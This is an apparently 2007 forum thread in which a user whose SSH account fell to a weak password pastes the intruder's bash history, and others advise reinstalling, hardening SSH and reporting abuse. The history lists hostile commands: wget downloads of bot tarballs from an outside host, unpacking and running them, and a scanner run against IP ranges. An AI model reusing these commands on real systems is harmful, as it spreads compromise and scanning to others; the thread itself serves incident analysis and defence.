---
title: "I got hacked, what did they do?"
date: 2007-07-15
forum: Server Platforms
---

### Post by Nasso on 2007-07-15
I got hacked. Had a user named tv with a password that was tv.. stupid but i used that user to watch movies and such via tv-out and i wanted to make it easy for the rest of the family to use. They got in through ssh did all kinds of stuff. luckily they didnt clear the .bash_rc folder. :)

What did they do? Anything dangerous? I guess i have to change my password on all accounts on the computer as well as my mail etc?

Need some other logs? What can i do to prevent this and how can i get more information?

I have an ip too. 86.127.212.104

Edit: i noticed it by seeing that ssh-scan was running and using bandwidth. checked the .bash_history file and saw alot of activity. what whould have happened if they erased the .bash_history file? :( whould it be impossible to see what they had done?
> 
w
who
cat/proc/cpuinfo
cat /proc/cpuinfo
ls -a
cd .mozilla
ls -a
cd firefox
ls -a
cd ..
cd /var/tmp
ls -a
mkdir .a
cd .a
wget tulceamuzic.uv.ro/roboti.tgz
tar xvfz roboti.tgz
rm -rf roboti.tgz
cd .n
pico m. set
nano m.set
sh
nano m.set
sh
cd /var/tmp
ls -a
rm -rf .a
mkdir .a
cd .a
wget tulceamuzic.uv.ro/idiot.tgz
tar xvfz idiot.tgz
rm -rf idiot.tgz
cd .n
pico m. set
nano m. set
nano 1.user
pico m. set
sh
php
The program 'php' is currently not installed.  To run 'php' please ask your administrator to install the package 'php5-cli'
php -v
mplayer -sub Desktop/Smokin\'.Aces\[2007\]DvDrip\[Eng\]-aXXo.srt /media/sda2/Film/Smokin\'.Aces\[2007\]DvDrip\[Eng\]-aXXo/*
cd Desktop/
mplayer -sub anchorman.dvdrip.xvid-deity.srt /media/sda2/Film/Anchorman\ -\ The\ Legend\ of\ Ron\ Burgundy\ \(2004\)\ \[ENG\]\ \[DVDrip\].avi 
w
who
php -v
screen -v
cat/proc/cpuinfo
cat /proc/cpuinfo
w
screen -v
ls -a
cd /var/tmp
ls -a
cd .a
ls -a
cd .n
ls -a
cd ..
screen -r
cd /var/tmp
ls -a
mkdir .b
cd .b
wget tulceamuzic.uv.ro/bac.tgz
screen -r
cd /var/tmp
cd .b
ftp
ls -a
tar xvfz bac.tgz
rm -rf bag.tgz
cd .bac
ls -a
pico pass_file
screen
./x 217.160
123.123;./x 123.124;./x 123.125;./x 123.126;./x 123.37;./x 217.60
./x 217.160;
ifconfig
sudo apt-get install open-ssh
su nasso
w
cd /var/tmp
ls -a
cd .a
ls -a
cd .n
ls -a
pwd
cd ..
pwd
cd ..
w
screen -r
sudo apt-get install frozen-bubble
su nasso
w
screen -r
cd /var/tmp
ls -a
cd .a
ls -a
cd ..
cd .b
ls -a
cd .bac
ls -a
screen
screen -r
screen -r 26155.pts-0.nasdesk
screen -r
screen 
screen -r
screen -r 26298.pts-0.nasdesk 
userset permident
./x 217.160;./x 71,6;./x 128.30;
./x 217.160;./71.6;./x128.30;
w
screen -r
cd /var/tmp
cd .a
ls -a
cd ..
ls -a
cd .b
ls -a
cd .bac
ls -a
cd vuln.txt
pico vuln.txt
nano vuln
vi vuln
screen
screen -r
w
php -v
screen -r
ftp ftp.3host.ro
./x 217.160;./x 71,6;./128.30;
w
cat /proc/cpuinfo
w
cd /var/tmp
ls -a
cd .a
ls -a
cd ..
cd .b
ls -a
cd .bac
ls -a
pico vuln.txt
screen
cd ..
cat /etc/hosts
screen -r
exit
./x 217.160
w
cd /dev/shm
ls -a
w
cd /var/tmp
ls -a
cd .a
ls -a
cd .n
ls -a
cd ..
rm -rf .a
ls -a
mkdir .botzi
cd .botzi
wget tulceamuzic.uv.ro/idiot.tgz
tar xvfz idiot.tgz
rm -rf idiot.tgz
cd .n
pico m.set
sh
w
cd /dev/shm
ls -a
cd ..
cd /var/tmp
ls -a
cd .botzi
ls -a
cd .n
pico m.set
cd ..
ls -a
cd ..
ls -a
pwd
ls -a
rm -rf .botzi
mkdir .botzi
cd .botzi
ls -a
wget tulceamuzic.uv.ro/idiot.tgz
tar xvfz idiot.tgz
rm -rf idiot.tgz
cd .n
pico m.set
sh
ls
locate ssh-scan
users
tv
sudo passwd tv
sudo passwd
sudo su
passwd tv
top
ps aux | grep tv


---

### Post by kerry_s on 2007-07-15
So they changed your "tv" password?
did you check /var/log/auth.log & auth.log.0?

also you should use mixed passwords(letters & numbers), try not to use simple dictionary words.
try something like> every1needs2usetv
just longer than just "tv", give a phrase that's easy, but mixed> Thereare5people2Watchtv

---

### Post by Mr. C. on 2007-07-15
Disconnect your system from the network, and reinstall the OS.

You have no idea what they have done.  The bash history can be forged, truncated, whatever.

NEVER allow easy user/password combinations when you are connected to the internet.  There are better, more secure ways to provide simple access from internal users, whilst preventing remote access.

Take the lumps, and learn the lesson.

MrC

---

### Post by koenn on 2007-07-15
I agree. Disconnect, and reinstall. 
You can see in the history how some archive files got downloaded, unpacked, and then probably something executed. 
You might want to keep those to figure out later what exactly they did but you can not trust your system anymore, it may be running all type of software, possibly attacking other computers,  without you knowing. 

So, if you're planning to use that computer again anytiome soon, reinstall. Your alternative is to keep it as it as, as proof, and call in the law, but that's a long shot.

---

### Post by DM was on fire! on 2007-07-15
Yep. I agree with everyone else. You should be able to reinstall all of your programs. It won't be that hard. Even if root wasn't accessible through GDM, I'd still do it. You don't know what could've happened.

---

### Post by daou on 2007-07-15
There are a lot of sh calls. They could've done anything in there without it showing up in your bash history.

---

### Post by koenn on 2007-07-15
> What can i do to prevent this
use stronger passwords (as mentioned by others)

and ask yourself why you allow ssh acces from the internet.

---

### Post by toorima on 2007-07-15
Secure ssh by specifying which users can log in over ssh, add 
AllowUsers username1, username2
to /etc/ssh/sshd_config
and of course, those users you allow to use ssh should have strong passwords

---

### Post by MianoSM on 2007-07-16
The wget a robot.

Your computer is trying to do the same thing that was done to it now. It would be most curteous of you to remove your computer from the internet, and get a fresh install, or do a system recovery if you have some sort of back up available.

Sorry to hear about that misfortune - but great job on figuring that out. : )

---

### Post by ubromtoo on 2007-07-16
After reading the above , I checked System Monitor and it lists something called 

 SSH-Agent as "sleeping" . Is this normal ?  Please forgive my ignorance . Should I 

 end or kill the process ?  :confused:

---

### Post by mr.farenheit on 2007-07-16
yeah most definetly reinstall. do a mem scan too. sometimes the scans will kill small bits of remnant data in the memory. it worked on windows and might work on linux too.

---

### Post by Mr. C. on 2007-07-16
ssh-agent is a component of ssh that saves your credentials so that subsequent ssh connections do not require rekeyed passphrases

Most processes are sleeping at any given time you happen to look at them. This is normal.

MrC

---

### Post by kvonb on 2007-07-16
I would save any logs that show the activity and send them in an email to the person's ISP, and report them for unauthorised access.

A whois on that IP shows this:

ABUSE CONTACT: [email]abuse@rdsnet.ro[/email] IN CASE OF HACK ATTACKS, ILLEGAL ACTIVITY, VIOLATION, SCANS, PROBES, SPAM, ETC.

It's Romanian, but you never know, the user might cop a ban or something :).

Oh, and DO NOT leave ssh open to the Internet in future!  A good simple strategy is to put ssh on a higher port, it avoids simple scans by script kiddies.  On my server I use Firestarter as my firewall front end, and assign only trusted IPs to be able to access ssh, and it also makes it easy to enable/disable access with a simple click.

---

### Post by Tmi on 2007-07-22
After reading this I wonder if there is any good log that logs any login try via ssh. I always have ssh on because I have two computers and also want access to my computer from other places such as the uni.

Is there any log file where I can see all logins or loginattempts via ssh on my computer?

---

### Post by angryfirelord on 2007-07-22
You should definitely consider running a firewall to configure your iptables. Firestarter is a good one.

---

### Post by koenn on 2007-07-22
> **Tmi said:**
> After reading this I wonder if there is any good log that logs any login try via ssh. I always have ssh on because I have two computers and also want access to my computer from other places such as the uni.

Is there any log file where I can see all logins or loginattempts via ssh on my computer?

/var/log/auth.log

older logs are zipped and saved with a number, eg /var/log/auth.log.1.gz

to filer uit ssh sessions, try
```
grep ssh /var/log/auth.log
```

---

### Post by Tmi on 2007-07-22
Thank you.

The logs show quite a few attempts of random login tries with usernames such as "sales",  "staff", "root", "admin" etc etc. 

Well, a friend said that was quite normal, and I have a no-word username and a non word-password so I guess I'm relatively safe :)

---

### Post by koenn on 2007-07-22
technically, you're just playing the oods. They may be in your favor with the non-word  username and strong password, but still. 

If you do want/need ssh access over the internet, you might want to limit the number of hosts it can be accessed from, either
- ssh with host-based authentication
- some vpn sollution
- a firewall that only allows ssh from certain hosts/networks
- use /etc/hosts.allow and /etc/hosts.deny to to only allow ssh from certain hosts/networks

like, you allow ssh from your own home network(s) and the uni network(s), but from nowhere else. It limits the number of people that can run password crackers or canned exploits against your sshd.

Some people advise to obscure the open ssh port behind a NAT router with portforwarding - eg ssh to port 8022 and let it be forwarded to port 22 of the actual system you want to access.  Defeats scanners who target port 22 or the usual service ports ( < 1024)  but it's really just security through obscurity : a portscan over a wider range of ports will still reveal that open port and detect an ssh daemon listening. Still, it's a usefull additional measure, and easy to implement.

---

### Post by Spudgun on 2007-07-23
> **angryfirelord said:**
> You should definitely consider running a firewall to configure your iptables. Firestarter is a good one.

That isn't going to help if he's allowing people to SSH in from the net anyway.

---

### Post by Spudgun on 2007-07-23
Looks like the cracker installed an IRC bot too.

---

### Post by koenn on 2007-07-23
> **Spudgun said:**
> That isn't going to help if he's allowing people to SSH in from the net anyway.
if he sets it up to filter source addresses, it helps

---

### Post by sjoerger on 2007-07-23
I recommend that anyone who is going to have an SSH server connected to the Internet do the following as a minimum:

1. Use SSH keys exclusively and disable password based authentication:
[http://the.earth.li/~sgtatham/putty/0.60/htmldoc/Chapter8.html#pubkey](http://the.earth.li/~sgtatham/putty/0.60/htmldoc/Chapter8.html#pubkey)

2. Use a tool like Denyhosts to twarth SSH server attacks: [http://denyhosts.sourceforge.net/index.html](http://denyhosts.sourceforge.net/index.html)

---

### Post by Macchi on 2007-07-23
This may have been mentioned many times before, but I would recommend:

* Use strong passwords and if possible avoid the most common usernames
* Allow ssh access only to a few selected users 
* Allocate ssh to a high port and change it regularly. Block port 22 on your firewall
* Use denyhosts (denyhosts.sourceforge.net) to prevent dictionary attacks on ssh
* Use keys (and strong passwords) for authentication.
* Change the ssh login message ([baner]("https://help.ubuntu.com/community/AdvancedOpenSSH#head-7e9a25fd60ac8821009dc585dad819361b352527")) to remind people that intruders may be prosecuted etc.

Denyhosts will not allow access to your system from black-listed IP addresses. 
Furthermore, it will report intruders to a central database after a certain number of failed login attempts.

---

### Post by supertux on 2007-07-24
what vulnerability do you have when you only use private/public key authentication? So no password authentication etc. Only user with valid key can login..

---

### Post by stinger30au on 2007-07-24
> **Nasso said:**
> 
Edit: i noticed it by seeing that ssh-scan was running and using bandwidth. checked the .bash_history file and saw alot of activity. what whould have happened if they erased the .bash_history file? :( whould it be impossible to see what they had done?


what command do you type to view it, will come in handy

---

### Post by eentonig on 2007-07-24
So you gave this tv user also sudo access? That's basically asking for problems.


Another thing you could do in the future. I 've got public ssh running for remote access to 1 machine. On that machine I'm running snort to do IDS, I run logcheck hourly to browse through my security logs for entries that I consider suspicious (basically failed and successfull logings) and I limited access to only a limited set of ip ranges. This is also a 'crash and burn' box. Meaning, there's nothing usefull on it (it's an old laptop) and I can easily reinstall it when I see suspicious behavior.

---

### Post by lisati on 2007-07-24
> **kvonb said:**
> I would save any logs that show the activity and send them in an email to the person's ISP, and report them for unauthorised access.

A whois on that IP shows this:

ABUSE CONTACT: [email]abuse@rdsnet.ro[/email] IN CASE OF HACK ATTACKS, ILLEGAL ACTIVITY, VIOLATION, SCANS, PROBES, SPAM, ETC.

It's Romanian, but you never know, the user might cop a ban or something :).

Oh, and DO NOT leave ssh open to the Internet in future!  A good simple strategy is to put ssh on a higher port, it avoids simple scans by script kiddies.  On my server I use Firestarter as my firewall front end, and assign only trusted IPs to be able to access ssh, and it also makes it easy to enable/disable access with a simple click.

There's a place "Abuse.net" which can sometimes help forward abuse reports to a particular ISP. If you have a complaint intended for [www.rotten.isp](www.rotten.isp) you would send an email with the relevant info to [email]rotten.isp@abuse.net[/email] If abuse.net knows about rotten.isp they forward it to the right email address. If they don't know about rotten.isp they do a "best guess" e.g. [email]postmaster@rotten.isp[/email] . You'll probably have to register the first time you use it (instructions will be sent by return email)

---

### Post by eentonig on 2007-07-24
If that's all they do, it's better to sent it directly to [email]abuse@rdsnet.ro[/email].

But don't expect to much about it. I sent abuse mails regularly (any hacking attempt that goes on for more then 30 minutes gets reported automatically. The rest, I consider script kiddies).

---

### Post by lisati on 2007-07-24
> **eentonig said:**
> If that's all they do, it's better to sent it directly to [email]abuse@rdsnet.ro[/email].

But don't expect to much about it. I sent abuse mails regularly (any hacking attempt that goes on for more then 30 minutes gets reported automatically. The rest, I consider script kiddies).

Good point.....

---

### Post by w116tjb on 2007-07-24
ftp ftp.3host.ro

Know what that FTP is?

---

### Post by lisati on 2007-07-24
> **w116tjb said:**
> ftp ftp.3host.ro

Know what that FTP is?

I wonder if the ".ro" is significant or if it's a red herring....No offence to anyone who has a legitimate .ro domain, but I smell a rat.....

---

### Post by w116tjb on 2007-07-24
> **lisati said:**
> I wonder if the ".ro" is significant or if it's a red herring....No offence to anyone who has a legitimate .ro domain, but I smell a rat.....

It's the country code for Romania.

---

### Post by lisati on 2007-07-24
> **w116tjb said:**
> It's the country code for Romania.

ok....it's probably a red herring....no offense intended, it's just that I sometimes get spam that suggests in its probably forged headers that it's from there.

---

### Post by MJN on 2007-07-24
<post deleted>

---

### Post by eentonig on 2007-07-24
> **MJN said:**
> Whilst the rules say we're not allowed to say '*Google it*', on this occasion I'm going to as you'll learn much more than me just telling you the answer. Indeed consider it two answers for the price of one as being able to use search engines can be incredibly helpful.

[http://www.google.co.uk/search?hl=en&q=ftp](http://www.google.co.uk/search?hl=en&q=ftp)

Result #1 will give you all you need to know.

If you have any further questions then of course I'd be happy to help more specifically. :)

Mathew

I think you misunderstood his question. The exact phrase was and is "Know what **that **FTP is?". Where the **that** is referring to the hostname in "ftp **ftp.3host.ro**"

If you're going to sent people to google (nothing against that myself), please do a good job at it.

Btw. 1 minute googling and three links down the road. I got "http://www.who.is/whois-ro/ip-address/3host.ro/"

---

### Post by MJN on 2007-07-24
Yes I did, sorry. I realised my mistake shortly after posting - you must've already quoted it before I subsequently deleted it.

My apologies to w116tjb for any potential offence caused.

Mathew

---

### Post by koenn on 2007-07-24
> **eentonig said:**
> Where the **that** is referring to the hostname in "ftp **ftp.3host.ro**"

Btw. 1 minute googling and three links down the road. I got "http://www.who.is/whois-ro/ip-address/3host.ro/"

```
# whois ftp.3host.ro

domain-name: 3host.ro
description: Top Labs Software Corporation
description: 208-3311 Bathurst Street
description: Toronto
description: Ontario
description: CA
description: Postal Code: M6A 2B5
description: Phone: +1 416 795-5227
description: Email: istoica@yahoo.com
description: Registration/ID Number:
description: Fiscal Code:
admin-contact: CS453-ROTLD
technical-contact: CS453-ROTLD
zone-contact: CS453-ROTLD
billing-contact: CS453-ROTLD
nameserver:  ns1.3host.ro 64.111.196.23
nameserver:  ns2.3host.ro 64.111.196.23
info:        Register your .ro domain names at http://www.rotld.ro/
notify:      domain-admin@listserv.rnc.ro
object-maintained-by: ROTLD-MNT
updated:     domain-admin@listserv.rnc.ro 20040928
updated:     flore@rnc.ro 20040928
updated:     dan@rotld.ro 20050307
updated:     dan@rotld.ro 20050425
source:      ROTLD
application-date: 20040916
domain-status: active
registration-date: 20040928

person:      Cristian Stoica
address:     Top Labs Software Corporation
address:     208 - 3311 Bathurst Street
address:     Toronto
address:     CA
address:     M6A 2B5
phone:       +1-416-795-5227
e-mail:      istoica@yahoo.com
nic-hdl:     CS453-ROTLD
notify:      domain-admin@listserv.rnc.ro
object-maintained-by: ROTLD-MNT
updated:     flore@rnc.ro 20040506
source:      ROTLD

```

```

# dig @ns1.3host.ro ftp.3host.ro A
 
 ;; ANSWER SECTION:
 ftp.3host.ro.		14400	IN	CNAME	3host.ro.
 3host.ro.		14400	IN	A	64.111.196.23

```

It's an ftp server with limited use - no anonylous login. 
However, they may well have nothing to do with the people who broke in to your computer. That guy just downloaded a number of exploits (?)  from the ftp server to run on your computer - similar to the wget statements earlier in the history.

---

### Post by musky on 2007-07-25
Stumbled on this thread & quite clueless & nooby with ubuntu & feisty. Any easy way to check for hacking (don't understand the above) & how to change the password for ubuntu log in..or not really a big deal there? thx

---

### Post by daou on 2007-07-25
> **musky said:**
> Stumbled on this thread & quite clueless & nooby with ubuntu & feisty. Any easy way to check for hacking (don't understand the above) & how to change the password for ubuntu log in..or not really a big deal there? thx

You can change your password by typing this in your terminal:

```
$ passwd *username*
```

Replacing username with your username. Then enter your old password, and then the new password (twice).

---

